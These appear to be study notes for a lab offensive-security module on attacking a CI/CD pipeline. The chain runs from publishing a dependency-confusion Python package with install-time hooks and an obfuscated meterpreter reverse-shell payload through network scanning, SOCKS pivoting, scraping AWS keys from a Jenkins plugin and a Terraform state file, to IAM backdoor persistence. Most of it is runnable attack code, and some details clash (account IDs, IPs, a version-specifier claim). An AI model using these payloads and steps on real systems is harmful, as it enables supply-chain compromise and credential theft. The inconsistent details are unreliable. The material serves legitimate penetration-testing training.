Firefox DevTools → Network tab on page load shows two `Server: Caddy` headers (app sits behind **two Caddy reverse proxies**) and one `Server: Werkzeug/1.0.1 Python/3.11.2` — telling us the backend app is **Python**.

### 26.8.2 Conducting open source intelligence

Searching forums for the app name ("hackshort") turns up a public post from a frustrated developer troubleshooting a broken container build — who pastes their `requirements.txt` line and an import statement:

```
hackshort-util~=1.1.0
```
```python
from hackshort_util import utils
```
Attempt to fetch the package from the public index configured for the lab:
```bash
kali@kali:~$ pip download hackshort-util
Looking in indexes: http://pypi.offseclab.io
ERROR: Could not find a version that satisfies the requirement hackshort-util (from versions: none)
ERROR: No matching distribution found for hackshort-util
```
Not found on the public index ⇒ it must live on a **private/internal** index — classic setup for a **dependency confusion** attack.

---

## 26.9 Dependency chain attack

### 26.9.1 Understanding the attack

Package managers (PyPI for Python, NPM for JS, etc.) prioritize certain repos/versions when resolving a dependency — commonly, the **official public repo** or the **highest version number** wins. But public registries typically let *anyone* register a package name (as long as it's not already taken) — so an attacker can publish a malicious package under the *same name* as an internal-only dependency, with a *higher* version number, and the resolver may pull the attacker's package instead of (or alongside, depending on config) the real internal one.

- If the victim's config uses `index-url` (replaces the default index entirely), only the configured index is checked.
- If it uses `extra-index-url` (adds an index *in addition to* the default PyPI), **both** are checked and the highest matching version across all indexes wins — this is the more exploitable case, and more common because every dev/CI environment independently needs this extra config (more chances one is misconfigured).

We don't know in advance which config the target uses — the attack itself is the test.

**pip version specifiers** (need to match/exceed what the target requires):

| Specifier | Meaning | Example |
|---|---|---|
| `==` | Exact match (wildcards allowed) | `some-package==1.0.0` matches only 1.0.0; `some-package==1.0.*` matches 1.0.0, 1.0.1, ... |
| `<=` | Version ≤ specified | `some-package<=1.0.0` matches 1.0.0, 0.0.9, 0.8.9 — not 1.0.1, 7.0.2 |
| `>=` | Version ≥ specified | Opposite of `<=` |
| `~=` | Compatible release — patch-level flexibility only | `some-package~=1.0.0` matches 1.0.1, 1.0.5, 1.0.9 — not 1.2.0, 2.0.0 |

The forum post's `hackshort-util~=1.1.0` requires we publish **1.1.2 or higher** (bump the third component upward, but nothing that changes the `1.1` prefix — chosen version: **1.1.4**).

Also note: `from hackshort_util import utils` imports with an **underscore** — Python identifiers can't contain a dash, so `hackshort-util` (PyPI package name, dashes OK) becomes `hackshort_util` (import name) by convention.

### 26.9.2 Building and testing the malicious package locally

Minimal Python package layout:
```
hackshort-util/
    setup.py
    hackshort_util/
        __init__.py
```
- `setup.py` (or `pyproject.toml` / `setup.cfg`) — the build/install script (setuptools).
- `hackshort_util/` — importable directory; dash replaced with underscore.
- `__init__.py` — marks the directory as a regular Python package (not needed for namespace packages, but used here).

```bash
kali@kali:~$ mkdir hackshort-util && cd hackshort-util
kali@kali:~/hackshort-util$ nano setup.py
```
```python
from setuptools import setup, find_packages

setup(
    name='hackshort-util',
    version='1.1.4',
    packages=find_packages(),
    classifiers=[],
    install_requires=[],
    tests_require=[],
)
```
```bash
kali@kali:~/hackshort-util$ mkdir hackshort_util
kali@kali:~/hackshort-util$ touch hackshort_util/__init__.py
```
- `name` must match the real target package name exactly (used on the index, dashes OK).
- `version` must satisfy the target's specifier while not going *too* high (per its clause).

```bash
kali@kali:~/hackshort-util$ python3 ./setup.py sdist
```
> A **source distribution** (`sdist`) is a collection of all files that make up a Python package.

```bash
kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
...
Successfully installed hackshort-util-1.1.4
```
Verify from a fresh shell/dir (avoid ambiguity with the local source dir shadowing the installed package):
```bash
kali@kali:~$ python3
>>> import hackshort_util
>>> print(hackshort_util)
<module 'hackshort_util' from '/home/kali/.local/lib/python3.11/site-packages/hackshort_util/__init__.py'>
```
Uninstall before iterating further:
```bash
kali@kali:~$ pip uninstall hackshort-util
Proceed (Y/n)? Y
Successfully uninstalled hackshort-util-1.1.4
```

### 26.9.3 Command execution during install

Two possible injection points:
1. **`setup.py`** — runs at **install/build time**.
2. **`utils.py`** (the submodule the target actually imports) — runs at **runtime**, including in production.

For install-time execution, `setuptools` supports a custom installer class via `cmdclass`:
```bash
kali@kali:~/hackshort-util$ cat -n setup.py
```
```python
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)
        with open('/tmp/running_during_install', 'w') as f:
            f.write('This code was executed when the package was installed')

setup(
    name='hackshort-util',
    version='1.1.4',
    packages=find_packages(),
    classifiers=[],
    install_requires=[],
    tests_require=[],
    cmdclass={'install': Installer}
)
```
`Installer.run()` calls `install.run(self)` first (so the real install still happens normally), *then* runs our custom payload.

```bash
kali@kali:~/hackshort-util$ rm ./dist/hackshort-util-1.1.4.tar.gz
kali@kali:~/hackshort-util$ cat /tmp/running_during_install   # No such file or directory
kali@kali:~/hackshort-util$ python3 ./setup.py sdist
kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
kali@kali:~/hackshort-util$ cat /tmp/running_during_install
This code was executed when the package was installed
```
Confirmed code execution at install time. (Turning this into a full reverse shell is left as an exercise in the book.)

### 26.9.4 Command execution during runtime

The forum post shows `from hackshort_util import utils` — but we don't know exactly which function(s) inside `utils` the app calls. Handle this with a `__getattr__` catch-all (Python calls this when an attribute/function lookup on the module fails) plus a global exception hook (in case the app's own logic throws on our stub return values), to buy time for further recon without crashing the app instantly.

```bash
kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
```
```python
import time
import sys

def standardFunction():
    pass

def __getattr__(name):
    pass
    return standardFunction

def catch_exception(exc_type, exc_value, tb):
    while True:
        time.sleep(1000)

sys.excepthook = catch_exception
```
- `__getattr__` — module-level hook fired for any missing name → returns `standardFunction` (a wildcard no-op).
- `catch_exception` — installed as `sys.excepthook`; any uncaught exception drops into an infinite sleep loop instead of crashing/exiting.

```bash
kali@kali:~/hackshort-util$ pip uninstall hackshort-util
kali@kali:~/hackshort-util$ python3 ./setup.py sdist
kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
```
```python
>>> from hackshort_util import utils
>>> utils.run()      # any arbitrary function call — no error
>>> 1/0               # -> infinite loop instead of crashing
```

### 26.9.5 Adding a payload

Use a **meterpreter** payload for flexibility (may catch multiple shells across dev laptops, lower environments, and production):
```bash
kali@kali:~$ msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
```
- `-p python/meterpreter/reverse_tcp` — Python meterpreter, reverse connection.
- `-f raw` — raw Python source (not a compiled binary).
- `LHOST`/`LPORT` — cloud Kali IP (must be internet-reachable) and an arbitrary port (4488).

Append the generated payload to the end of `hackshort_util/utils.py` so it fires as soon as the module is imported:
```python
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
```
> Note (transcriber): this base64/zlib blob is copied verbatim from the OCR'd source — it's the raw `msfvenom` output for this specific lab instance and won't match your own generated payload.

```bash
kali@kali:~$ ssh kali@192.88.99.76      # cloud Kali
kali@cloud-kali:~$ sudo msfdb init
kali@cloud-kali:~$ msfconsole

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4488
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -jz
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 0.0.0.0:4488
```
- `LHOST 0.0.0.0` — listen on all interfaces.
- `ExitOnSession false` — don't tear down the handler after the first shell (expecting multiple).
- `run -jz` — run as a background **job** (`-j`), and don't auto-interact with new sessions (`-z`), useful if flooded with shells.

Test locally first (uninstall/rebuild/reinstall, then import):
```bash
kali@kali:~/hackshort-util$ pip uninstall hackshort-util
kali@kali:~/hackshort-util$ python3 ./setup.py sdist
kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
kali@kali:~$ python3
>>> from hackshort_util import utils
```
```
msf6 exploit(multi/handler) >
[*] Sending stage (24772 bytes) to 233.252.50.125
[*] Meterpreter session 1 opened (10.0.1.87:4488 -> 233.252.50.125:52342)
```
```bash
msf6 exploit(multi/handler) > sessions -i 1
meterpreter > exit    # confirm it works, then close — this is just our own test shell
```

### 26.9.6 Publishing our malicious package

In a real engagement you'd register on the real public PyPI — here, target the lab's stand-in public-facing index instead (`pypi.offseclab.io`, creds `student`/`password`):
```bash
kali@kali:~/hackshort-util$ nano ~/.pypirc
```
```ini
[distutils]
index-servers =
    offseclab

[offseclab]
repository: http://pypi.offseclab.io/
username: student
password: password
```
```bash
kali@kali:~/hackshort-util$ python3 setup.py sdist upload -r offseclab
Submitting dist/hackshort-util-1.1.4.tar.gz to http://pypi.offseclab.io/
Server response (200): OK
```
> **Tip** — to remove a bad upload: `curl -u "student:password" --form ":action=remove_pkg" --form "name=hackshort-util" --form "version=1.1.4" http://pypi.offseclab.io/`

> The production web server in this lab rebuilds every **10 minutes** — if no shell within 10 minutes, something's wrong.

```
msf6 exploit(multi/handler) >
[*] Sending stage (24772 bytes) to 44.211.221.172
[*] Meterpreter session 2 opened (10.0.1.54:4488 -> 44.211.221.172:37604)
```
Code execution in **production**, confirmed.

---

## 26.10 Compromising the environment

Goal now: pivot from a single container foothold to broader access — finding secrets on the filesystem, pivoting to other services, and/or escalating to an administrator account in the cloud provider.

### 26.10.1 Enumerating the production container

```
msf6 exploit(multi/handler) > sessions
Id  Name  Type              Information               Connection
2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)
msf6 exploit(multi/handler) > sessions -i 2
```
```
meterpreter > ifconfig
Interface 1 : lo    127.0.0.1/255.0.0.0
Interface 41: eth1  172.30.0.3/255.255.0.0
Interface 43: eth0  172.18.0.4/255.255.0.0
```
(Meterpreter's `ifconfig` is a built-in tool, not the Linux binary — output format differs slightly.) Two distinct internal ranges discovered: `172.18.0.0/16` and `172.30.0.0/16`.

```
meterpreter > shell
whoami
root
ls -alh
drwxr-xr-x 8 root root 162 ... .git
-rw-r--r-- 1 root root 199 ... Dockerfile
-rw-r--r-- 1 root root 15K ... README.md
drwxr-xr-x 1 root root  52 ... app
-rw-r--r-- 1 root root 167 ... pip.conf
-rw-r--r-- 1 root root 196 ... requirements.txt
-rw-r--r-- 1 root root 123 ... run.py
```
Running as **root**, random alphanumeric hostname ⇒ likely a container.
```
mount
overlay on / type overlay (rw,relatime,lowerdir=...,upperdir=...,workdir=...)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
...
```
Confirmed — Docker overlay filesystem. Given the container context, **environment variables** jump in priority (often used to inject secrets):
```
printenv
HOSTNAME=6699d104d6c5
SECRET_KEY=asdfasdfasdfasdf
PYTHON_PIP_VERSION=22.3.1
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
ADMIN_PASSWORD=password
ADMIN_USERNAME=admin
SQLALCHEMY_DATABASE_URI=sqlite:////data/data.db
```
`ADMIN_USERNAME`/`ADMIN_PASSWORD`, `SECRET_KEY`, `GPG_KEY` all noted for later use.

> The service restarts periodically — if a session dies mid-enumeration, a **new** meterpreter session should appear automatically; reattach with `sessions -i <new-id>`.

### 26.10.2 Scanning the network

Nmap isn't installed in the container, and installing it is noisy/undesirable; tunneling nmap through the meterpreter session is slow and unreliable. Instead, write a small pure-Python scanner and run it **from inside** the container (Python is already present, since it's how the shell was obtained):
```bash
kali@kali:~$ nano netscan.py
```
```python
import socket
import ipaddress
import sys

def port_scan(ip_range, ports):
    for ip in ip_range:
        print(f"Scanning {ip}")
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(.2)
            result = sock.connect_ex((str(ip), port))
            if result == 0:
                print(f"Port {port} is open on {ip}")
            sock.close()

ip_range = ipaddress.ip_network(sys.argv[1], strict=False)
ports = [80, 443, 8080]
port_scan(ip_range, ports)
```
- `sock.settimeout(.2)` — short timeout is fine for a local/internal network scan.
- `ports = [80, 443, 8080]` — kept small; every extra port multiplies scan time.
- A full `/16` scan over 3 ports = **190,000+** requests — scope down to `/24` chunks unless you optimize further.

```bash
# Stage the script via the cloud Kali instance, then push it into the container via meterpreter
kali@kali:~$ scp ./netscan.py kali@34.203.75.99:/home/kali/
meterpreter > upload /home/kali/netscan.py /netscan.py
```
```
meterpreter > shell
python /netscan.py 172.18.0.1/24
Port 80 is open on 172.18.0.1
Port 80 is open on 172.18.0.2
Port 80 is open on 172.18.0.3
...
```
```bash
curl -vv 172.18.0.1     # Server: Caddy
curl -vv 172.18.0.2     # Server: Caddy
```
`172.18.0.1` is likely the **gateway** (routes back to the host from inside the container network) — often reachable only from inside, not from the general internet. Both `172.18.0.1` and `.0.2` front the same Caddy service seen during initial app enumeration.

```bash
python /netscan.py 172.30.0.1/24
Port 80   is open on 172.30.0.1
Port 8080 is open on 172.30.0.30
Port 8080 is open on 172.30.0.50
...
```
```bash
curl 172.30.0.30:8080/
# redirects to /login
curl 172.30.0.30:8080/login
# <title>Sign in [Jenkins]</title> ... <a href="signup">create an account</a> ...
```
Port `8080` hosts a **Jenkins** instance with **self-registration enabled** — a very promising target (open registration greatly increases the odds of further compromise).

### 26.10.3 Tunneling to the Jenkins server

Jenkins on `172.30.0.30:8080` is only reachable from inside the container's network — set up a **SOCKS proxy through the meterpreter session**, tunneled out to your personal Kali via SSH local port-forward:

```
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 1.
```
SOCKS proxy defaults to `127.0.0.1:1080` on the **cloud Kali** instance.

```
msf6 auxiliary(server/socks_proxy) > sessions
2   meterpreter python/linux root @ 6699d104d6c5   10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)
msf6 auxiliary(server/socks_proxy) > route add 172.30.0.1 255.255.0.0 2
```
`route add <net> <mask> <session-id>` — traffic sent through the SOCKS proxy destined for that network gets routed through session 2.

```bash
# From your PERSONAL Kali: SSH local port-forward to the cloud Kali's SOCKS proxy
kali@kali:~$ ssh -fN -L localhost:1080:localhost:1080 kali@192.88.99.76
kali@kali:~$ ss -tulpn
tcp LISTEN 0 128 127.0.0.1:1080 0.0.0.0:*
```
- `-L localhost:1080:localhost:1080` — local forward: open port 1080 locally, forward to port 1080 on the remote (cloud Kali) side.
- `-N` — don't execute a remote command, tunnel only.
- `-f` — background the SSH session after auth.

Configure Firefox on your **personal** Kali: Settings → Network Settings → Manual proxy configuration → **SOCKS Host** `127.0.0.1`, **Port** `1080`, **SOCKS v5**. Traffic flow: Firefox → local SSH tunnel → cloud Kali SOCKS proxy → meterpreter route → Jenkins container network. Browsing to `http://172.30.0.30:8080` now loads the Jenkins login page through all the tunnel layers.

### 26.10.4 Exploiting Jenkins

Self-registration is enabled — create an account and enumerate what it can access.

> Anonymous read access is a common Jenkins misconfiguration on its own — many instances allow *any* authenticated (or even unauthenticated) user broad read access unless **Matrix Authorization Strategy** or **Role-based Authorization Strategy** plugins are configured to restrict it.

From the Dashboard, a project called **company-dir** stands out. Its available actions (Status, Changes, Build now, **S3 Explorer**) are limited — but **S3 Explorer** isn't a default Jenkins plugin. It wraps the `aws-js-s3-explorer` project, whose own documentation flags a known issue: AWS credentials for browsing the bucket are embedded client-side.

> The S3 Explorer plugin's homepage carries a security warning about this exact risk.

Per the `aws-js-s3-explorer` project description: *"The `index.html`, `explorer.js`, and `explorer.css` files in this bucket contain the entire application"* — meaning the AWS ID/key used to browse the bucket are retrievable straight from page source.

```bash
# Bucket name shown when the plugin loads: company-directory-9b58rezp3vvkf90f
```
> Slow tunneled connections sometimes cause the S3 explorer JS to fail to actually list the bucket contents — this doesn't affect the underlying page HTML, so the exploit still works.

**View Source** on the S3 Explorer page reveals hidden inputs:
```html
<input type="hidden" id="awsregion" value="...">
<input type="hidden" id="awsid" value="AKIAUBHUBEGIMWGUDSWQ">
<input type="hidden" id="awskey" value="e7pRWvsGgTyB8UHNXilvCZdC9xZPA8oF3KtUwaJ5">
<script src="http://automation.offseclab.io/plugin/s3explorer/js/s3explorer.js"></script>
```
`awsregion`, `awsid`, and `awskey` = a full set of usable AWS access credentials, leaked via a Jenkins plugin.

### 26.10.5 Enumerating with discovered credentials

```bash
kali@kali:~$ aws configure --profile=stolen-s3
AWS Access Key ID [None]: AKIAUBHUBEGIMWGUDSWQ
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1

kali@kali:~$ aws --profile=stolen-s3 sts get-caller-identity
{
    "UserId": "AIDAUBHUBEGIFYDAVQPLB",
    "Account": "347537569308",
    "Arn": "arn:aws:iam::277537169808:user/s3_explorer"
}
```
```bash
kali@kali:~$ aws --profile=stolen-s3 iam list-user-policies --user-name s3_explorer
# AccessDenied — user can't view its own policy
```
Can't self-enumerate permissions — fall back to methodical, purpose-driven testing. We know this credential exists to browse `company-directory-9b58rezp3vvkf90f`:
```bash
kali@kali:~$ aws --profile=stolen-s3 s3 ls company-directory-9b58rezp3vvkf90f
2023-07-06 13:49:19  117 Alen.I.vcf
2023-07-06 13:49:19  118 Goran.B.vcf
2023-07-06 13:49:19  117 Zeljko.B.vcf
```
Works as expected — try going further, listing **every** bucket in the account:
```bash
kali@kali:~$ aws --profile=stolen-s3 s3api list-buckets
{
    "Buckets": [
        { "Name": "company-directory-9b58rezp3vvkf90f", "CreationDate": "2023-07-06T16:21:16+00:00" },
        { "Name": "tf-state-9b58rezp3vvkf90f",           "CreationDate": "2023-07-06T16:21:16+00:00" }
    ]
}
```
A `tf-state-*` bucket — `tf` commonly denotes **Terraform**, and a Terraform *state* file records the full current infrastructure config, often including secrets in plaintext.

### 26.10.6 Discovering the state file and escalating to admin

Reading the state file needs `s3:GetObject`; discovering its filename needs `s3:ListBucket` too:
```bash
kali@kali:~$ aws --profile=stolen-s3 s3 ls s3://tf-state-9b58rezp3vvkf90f
2023-07-06 12:19:16  ...  terraform.tfstate
```
```bash
kali@kali:~$ aws --profile=stolen-s3 s3 cp s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate ./
download: s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate to ./terraform.tfstate
```
```bash
kali@kali:~$ cat -n terraform.tfstate
```
```json
{
  "user_list": {
    "value": [
      {
        "email": "Goran.Bregovic@offseclab.io",
        "name": "Goran.B",
        "phone": "+1 555-123-4567",
        "policy": "arn:aws:iam::aws:policy/AdministratorAccess"
      },
      {
        "email": "Zeljko.Bebek@offseclab.io",
        "name": "Zeljko.B",
        "phone": "+1 555-123-4568",
        "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
      },
      {
        "email": "Alen.Islamovic@offseclab.io",
        "name": "Alen.I",
        "phone": "+1 555-123-4569",
        "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
      }
    ]
  }
}
```
Three users; **Goran.B** is the only one with `AdministratorAccess`. Scroll further into `"resources"` and find the actual keys per user:
```json
{
  "resources": [
    {
      "index_key": "Goran.B",
      "schema_version": 0,
      "attributes": {
        "id": "AKIAUBHUBEGIGZN3IP46",
        "secret": "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"
      }
    }
  ]
}
```
```bash
kali@kali:~$ aws configure --profile=goran.b
AWS Access Key ID [None]: AKIAUBHUBEGIGZN3IP46
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1

kali@kali:~$ aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
{
    "AttachedPolicies": [
        { "PolicyName": "AdministratorAccess", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess" }
    ]
}
```
Confirmed — full administrator access to the AWS account for this lab environment.

> **Why this matters**: Terraform state files routinely embed plaintext secrets (access keys, passwords, private keys) for every resource they manage. A state file stored in S3 without tight access control is effectively a plaintext credentials dump — treat `tf-state*`/`*.tfstate` objects as high-value targets during any cloud engagement.

---

## 26.11 Wrapping up

Chain recap:
- **Lab 1**: exposed application → S3 bucket (public via `AuthenticatedUsers` confusion) hosting a git repo → git history leaked hardcoded Gitea admin creds → pipeline (`Jenkinsfile`) editable and webhook-triggered on push → poisoned pipeline for a reverse shell on the Jenkins builder → AWS creds inherited from `withAWS` had full IAM admin → backdoor IAM user created for persistence.
- **Lab 2**: OSINT (forum post) revealed a missing internal Python dependency → dependency-confusion package published to the public-facing index → RCE in production → internal network scan from inside the container → SOCKS-tunneled into an internal self-registering Jenkins → vulnerable **S3 Explorer** plugin leaked AWS keys client-side → those keys enumerated an S3 bucket containing a **Terraform state file** → state file contained a full-admin IAM user's access key/secret.

Lab cleanup:
```bash
# Reset personal Kali's DNS
kali@kali:~$ nmcli connection modify "Wired connection 1" ipv4.dns ""
kali@kali:~$ sudo systemctl restart NetworkManager
```
> **Tip** — if you have a preferred DNS server, set that instead of leaving it empty.

```bash
# Remove pip/PyPI config files created during the module
kali@kali:~$ rm ~/.pypirc
kali@kali:~$ rm ~/.config/pip/pip.conf
```
- Also remove the manual SOCKS proxy configuration from Firefox (the proxy itself closes once the Metasploit session/SSH tunnel ends, but the browser setting will otherwise silently break your normal browsing).
- Confirm connectivity is restored by browsing to any public site.

---

## Key Takeaways / Workflow Summary

1. **Enumerate every exposed CI/CD component separately** — SCM (Gitea/GitHub/GitLab), automation server (Jenkins), and the application itself. Version-fingerprint each for public exploits (`jenkins_enum`, SCM "About" pages, HTTP `Server` headers).
2. **S3 buckets found via app source/HTML are gold** — check public read (`curl` the root), brute-force common paths (`dirb`) if listing is blocked, and always check for a `.git/` folder hiding an entire repo.
3. **`AuthenticatedUsers` grants ≠ "users in my AWS account"** — it means *any* authenticated AWS principal, account-agnostic. Configure `aws configure --profile=X` with any IAM creds and just try `aws s3 ls`.
4. **Git history never forgets** — `gitleaks detect` first, but always follow up with manual `git log` / `git show <hash>` review; hardcoded secrets "fixed" in a later commit are still sitting in the diff.
5. **Poisoning a pipeline**: find the pipeline definition (`Jenkinsfile`, `.gitlab-ci.yml`, `.github/workflows/`) in the repo you can edit, confirm a webhook triggers it on push, then iterate a payload from `echo` → `withAWS` credential retention → `script{}` (avoid Groovy shells — sandboxed) → `sh` step (Nodes and Processes plugin) → `isUnix()`-guarded reverse shell.
6. **Container enumeration after a pipeline shell**: `uname -a` / `/etc/os-release` for OS mismatch clues, `/proc/mounts` for overlay fs, `/proc/self/status` + `capsh --decode` for capabilities, `env | grep AWS` for inherited pipeline credentials.
7. **Discover your own IAM permission boundary**: `sts get-caller-identity` → `iam list-user-policies` / `list-attached-user-policies` / `list-groups-for-user` → `iam get-user-policy` for inline policy contents. If self-enumeration is denied, test methodically against the resource the credential was clearly scoped for.
8. **Backdoor persistence**: `iam create-user` → `iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` → `iam create-access-key` → new local profile. Use an inconspicuous username in real engagements.
9. **Dependency confusion**: find a private-package reference (forum posts, error messages, leaked `requirements.txt`), confirm it's absent from the public index (`pip download`), match its version specifier (`~=`, `==`, `<=`, `>=`) with a higher version, build with `setuptools`, and plant payloads in `setup.py` (install-time, via `cmdclass`) and/or the actually-imported submodule (runtime, via `__getattr__` wildcard + `sys.excepthook`).
10. **Post-exploitation network pivoting from a container**: no nmap? Write a tiny Python `socket.connect_ex` scanner, `scp`/`upload` it in via meterpreter, scan `/24` chunks of every discovered interface subnet, `curl`/banner-grab open ports to fingerprint services.
11. **Reach internal-only services** (like an internal Jenkins) via `auxiliary/server/socks_proxy` + `route add <net> <mask> <session>` in Metasploit, then a local SSH port-forward (`ssh -fN -L`) from your own Kali, then point Firefox's manual SOCKS proxy at the forwarded port.
12. **Self-registering Jenkins + risky plugins** (e.g. S3 Explorer / `aws-js-s3-explorer`) can leak AWS keys directly in page source — always **View Source** on any AWS-integration plugin page.
13. **Terraform state files (`*.tfstate`) in S3 are high-value targets** — they routinely contain plaintext credentials for every managed resource/user, including admin-level IAM keys.
